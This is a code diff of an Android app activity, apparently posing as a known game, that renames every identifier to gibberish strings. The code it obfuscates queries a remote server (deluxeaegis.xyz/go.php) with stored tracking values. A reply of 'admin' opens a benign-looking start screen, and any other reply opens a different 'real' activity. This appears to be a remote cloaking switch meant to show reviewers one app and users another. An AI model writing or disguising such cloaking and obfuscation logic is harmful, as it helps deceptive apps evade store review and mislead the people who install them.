@@ -1,7 +1,7 @@
 package com.fuseboxgames.loveislang.deluxeblack;
 
-import static com.fuseboxgames.loveislang.deluxeblack.MainActivity.DLNK1;
-import static com.fuseboxgames.loveislang.deluxeblack.ReplaceDeluxeAct.C_STR1;
+import static com.fuseboxgames.loveislang.deluxeblack.MainActivity.KIDODOFODFO;
+import static com.fuseboxgames.loveislang.deluxeblack.ReplaceDeluxeAct.LDOSFKFDKKDF;
 
 import android.content.Intent;
 import android.os.AsyncTask;
@@ -21,32 +21,32 @@ public class FilterDeluxe extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_filter);
-        new asyncFunc().execute();
+        new losaiidsi().execute();
     }
 
 
-    public class asyncFunc extends AsyncTask<Void, Void, Void> {
+    public class losaiidsi extends AsyncTask<Void, Void, Void> {
 
 
-        String result;
-        String cAdder = Hawk.get(C_STR1);
-        String dAdder = Hawk.get(DLNK1);
-        String corelnk = "http://deluxeaegis.xyz/go.php?to=1&";
-        String oneis = "sub_id_1=";
-        String namelnk = corelnk + oneis + cAdder;
-        String deeplnk = corelnk + oneis + dAdder;
+        String hsdjfjjfd;
+        String opdspdpdsak = Hawk.get(LDOSFKFDKKDF);
+        String tysduudsaidsi = Hawk.get(KIDODOFODFO);
+        String msadlldsaodaso = "http://deluxeaegis.xyz/go.php?to=1&";
+        String psdoadkksdkksad = "sub_id_1=";
+        String msladoosdao = msadlldsaodaso + psdoadkksdkksad + opdspdpdsak;
+        String wesardrsdrrsdrds = msadlldsaodaso + psdoadkksdkksad + tysduudsaidsi;
 
         @Override
         protected Void doInBackground(Void... voids) {
             try {
 
                 Document doc;
-                if (!cAdder.equals("null")){ //сменил логический ноль на стринг
-                    doc = Jsoup.connect(namelnk).get();
+                if (!opdspdpdsak.equals("null")){ //сменил логический ноль на стринг
+                    doc = Jsoup.connect(msladoosdao).get();
                 } else {
-                    doc = Jsoup.connect(deeplnk).get();
+                    doc = Jsoup.connect(wesardrsdrrsdrds).get();
                 }
-                result = doc.text();
+                hsdjfjjfd = doc.text();
 
             } catch (Exception e) {
                 e.printStackTrace();
@@ -59,13 +59,13 @@ public class FilterDeluxe extends AppCompatActivity {
         protected void onPostExecute(Void aVoid) {
             super.onPostExecute(aVoid);
 
-            Intent i1 = new Intent(getApplicationContext(), StartScreenDeluxe.class);
+            Intent hdidfod = new Intent(getApplicationContext(), StartScreenDeluxe.class);
 
-            Intent i2 = new Intent(getApplicationContext(), RealActDelux.class);
-            if (result.equals("admin")) {
-                startActivity(i1);
+            Intent esartdttds = new Intent(getApplicationContext(), RealActDelux.class);
+            if (hsdjfjjfd.equals("admin")) {
+                startActivity(hdidfod);
             } else {
-                startActivity(i2);
+                startActivity(esartdttds);
             }
             overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
             finish();
